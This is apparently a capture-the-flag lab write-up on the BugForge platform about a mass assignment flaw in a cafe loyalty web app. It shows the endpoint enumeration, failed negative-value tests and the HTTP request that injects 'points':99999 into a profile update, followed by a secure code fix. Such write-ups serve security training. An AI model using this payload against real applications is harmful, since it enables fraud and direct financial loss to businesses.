---
layout: default
title: "Cafe Club (Mass Assignment) - BugForge"
---

[← Back](./)

# BugForge - Cafe Club Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-15</span>
  <span><strong>Difficulty:</strong> Easy</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Mass Assignment on profile update endpoint (CWE-915) — arbitrary field injection overwrites loyalty points balance

**Business Impact:** An attacker can grant themselves unlimited loyalty points, redeeming them for free products and causing direct financial loss to the business.

---

## Objective
Find and exploit a vulnerability in the Cafe Club coffee shop loyalty program web application.

## Initial Access
```bash
# Target Application
URL: https://lab-1773600707428-y7pmye.labs-app.bugforge.io

# Auth details
Registered account via POST /api/register
User: id=5, username=haxor, role=user
Auth: JWT HS256 in Authorization Bearer header
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Mass Assignment on Profile Update Endpoint (CWE-915)** — The `PUT /api/profile` endpoint blindly applies all JSON fields from the request body to the user record. Intended fields are `full_name`, `email`, `address`, and `phone`, but the server accepts and persists any additional field — including `points`. An attacker can set their loyalty points to an arbitrary value with a single request.

**CVSS v3.1 Score for Mass Assignment:** **9.1 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | None |
| Integrity | High |
| Availability | High |

## Enumeration Summary

### Application Analysis

**Tech Stack:**
- Backend: Express (Node.js) — `X-Powered-By: Express`
- Auth: JWT HS256 — payload: `{"id":5,"username":"haxor","iat":...}`
- API: REST JSON

**Target Endpoints Discovered:**

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/register` | POST | Registration |
| `/api/verify-token` | GET | Token validation |
| `/api/products` | GET | Product catalog |
| `/api/products/:id/reviews` | POST | Submit review |
| `/api/favorites/:id` | POST | Favorite a product |
| `/api/cart` | GET/POST | View/add to cart |
| `/api/checkout` | POST | Place order |
| `/api/orders` / `/api/orders/:id` | GET | Order history |
| `/api/profile` | GET/PUT | View/update profile |
| `/api/profile/password` | PUT | Change password |
| `/api/giftcards` | GET | List gift cards |
| `/api/giftcards/purchase` | POST | Buy gift card |
| `/api/giftcards/redeem` | POST | Redeem gift card code |

## Attack Chain Visualization
```
┌──────────────┐    ┌──────────────────┐    ┌─────────────────────┐
│  Register    │───▶│  Map API Surface │───▶│  Identify Profile   │
│  Account     │    │  (Caido)         │    │  Update Endpoint    │
└──────────────┘    └──────────────────┘    └─────────┬───────────┘
                                                      │
                                                      ▼
                                           ┌─────────────────────┐
                                           │  PUT /api/profile   │
                                           │  Add "points":99999 │
                                           │  to JSON body       │
                                           └─────────┬───────────┘
                                                      │
                                                      ▼
                                           ┌─────────────────────┐
                                           │  Server applies all │
                                           │  fields — points    │
                                           │  overwritten ✓      │
                                           │  Flag returned      │
                                           └─────────────────────┘
```

**Attack Path Summary:**
1. Register account and authenticate via JWT
2. Map all API endpoints through Caido HTTP proxy
3. Identify `PUT /api/profile` accepts JSON body for profile fields
4. Inject `"points":99999` into the profile update request body
5. Server applies all fields without whitelisting — points overwritten, flag returned

---

## Exploitation Path

### Step 1: Reconnaissance — API Surface Mapping
Registered an account and explored the application through Caido, capturing all HTTP requests. Identified 13 API endpoints across authentication, products, cart/checkout, profile, gift cards, and orders.

Key observations:
- Backend is Express (Node.js) per `X-Powered-By` header
- Auth uses JWT HS256 with payload `{"id":5,"username":"haxor","iat":...}`
- Points system: checkout earns points (≈ floor of total), points apply as ~$1 discount each
- Gift cards: purchase with credit card → receive code → redeem code to add balance

### Step 2: Testing Business Logic Abuse Vectors
Tested several negative-value attacks against the points/money flow:

```http
POST /api/checkout
{"points_to_use": -1000}
→ 400: "Points to use cannot be negative"

POST /api/cart
{"product_id": 1, "quantity": -5}
→ 400: "Valid product ID and quantity are required"

POST /api/giftcards/purchase
{"amount": -100}
→ 400: "Invalid gift card amount"
```

All negative-value vectors were properly validated server-side. Dead ends.

### Step 3: Mass Assignment on Profile Update
Examined the profile update endpoint. The normal request body contains `full_name`, `email`, `address`, and `phone`. Tested whether additional fields would be accepted:

```http
PUT /api/profile HTTP/1.1
Host: lab-1773600707428-y7pmye.labs-app.bugforge.io
Authorization: Bearer <jwt>
Content-Type: application/json

{"full_name":"","email":"test@test.com","address":"test","phone":"test","points":99999}
```

### Step 4: Flag Captured
The server processed all fields without whitelisting, directly updating the user record:

```json
{"message":"Profile updated successfully bug{pyE88sSYdWCujFizpld1ES18ft3CkGO8}"}
```

Points balance was overwritten to 99999. The flag was returned inline in the success message.

---

## Flag / Objective Achieved

✅ `bug{pyE88sSYdWCujFizpld1ES18ft3CkGO8}`

---

## Key Learnings

- **Mass assignment is a common flaw in REST APIs** that accept JSON bodies and map them directly to database models without field whitelisting. Always check whether non-intended fields are accepted.
- **Business logic validation doesn't prevent all abuse** — the app correctly blocked negative values on checkout, cart, and gift cards, but missed the simpler vector of directly overwriting the points field.
- **Profile update endpoints are high-value targets** — they're designed to accept user-controlled input and write it to the database, making them a natural place for mass assignment.
- **Node.js/Express APIs using ORMs like Sequelize or Mongoose** are especially susceptible when using generic update methods (`Model.update(req.body)`) without specifying allowed fields.

---

## Tools Used

- **Caido** - HTTP proxy for request interception, API mapping, and replay
- **Browser DevTools** - Initial application exploration

---

## Remediation

### 1. Mass Assignment — Profile Update (CVSS: 9.1 - Critical)

**Issue:** `PUT /api/profile` applies all request body fields to the user record without whitelisting, allowing attackers to modify sensitive fields like `points`.

**CWE Reference:** CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes

**Fix:**
```javascript
// BEFORE (Vulnerable)
app.put('/api/profile', auth, async (req, res) => {
  await User.update(req.body, { where: { id: req.user.id } });
  res.json({ message: 'Profile updated successfully' });
});

// AFTER (Secure)
app.put('/api/profile', auth, async (req, res) => {
  const { full_name, email, address, phone } = req.body;
  await User.update(
    { full_name, email, address, phone },
    { where: { id: req.user.id } }
  );
  res.json({ message: 'Profile updated successfully' });
});
```

Additional defense-in-depth measures:
- Use ORM-level field protection (e.g., Sequelize `fields` option, Mongoose `select`)
- Mark sensitive fields as non-mass-assignable at the model level
- Add integration tests that verify extra fields in profile updates are ignored

---

## Failed Attempts

### Approach 1: Negative points_to_use at checkout
```http
POST /api/checkout
{"points_to_use": -1000}
```
**Result:** Failed - Server validates that points cannot be negative (400 response)

### Approach 2: Negative cart quantity
```http
POST /api/cart
{"product_id": 1, "quantity": -5}
```
**Result:** Failed - Server validates that quantity must be positive (400 response)

### Approach 3: Negative gift card purchase amount
```http
POST /api/giftcards/purchase
{"amount": -100}
```
**Result:** Failed - Server validates gift card amount (400 response)

---

## OWASP Top 10 Coverage

- **A01:2021** - Broken Access Control (mass assignment allows users to modify fields they should not have access to)
- **A04:2021** - Insecure Design (API lacks field whitelisting as a design-level control)
- **A08:2021** - Software and Data Integrity Failures (user-supplied data applied to data model without integrity validation)

---

## References

**Mass Assignment Resources:**
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [PortSwigger: Mass Assignment Vulnerabilities](https://portswigger.net/web-security/api-testing#mass-assignment-vulnerabilities)
- [OWASP API Security Top 10 — API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)

---

**Tags:** `#mass-assignment` `#api-security` `#nodejs` `#express` `#business-logic` `#bugforge`
